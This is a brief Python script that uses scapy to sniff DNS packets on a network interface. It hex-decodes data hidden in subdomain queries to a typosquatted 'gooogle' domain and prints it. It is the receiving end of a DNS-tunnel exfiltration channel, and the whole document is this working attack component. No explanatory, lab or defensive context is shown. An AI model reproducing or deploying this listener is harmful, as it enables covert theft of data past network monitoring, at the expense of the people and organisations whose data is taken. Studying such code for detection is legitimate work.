try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")

def process_packet(pkt):
    if pkt.haslayer(DNS):
        domain = pkt[DNS][DNSQR].qname.decode('utf-8')
        root_domain = domain.split('.')[1]
        if root_domain.startswith('gooogle'):
            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')

sniff(iface="eth0", prn=process_packet)
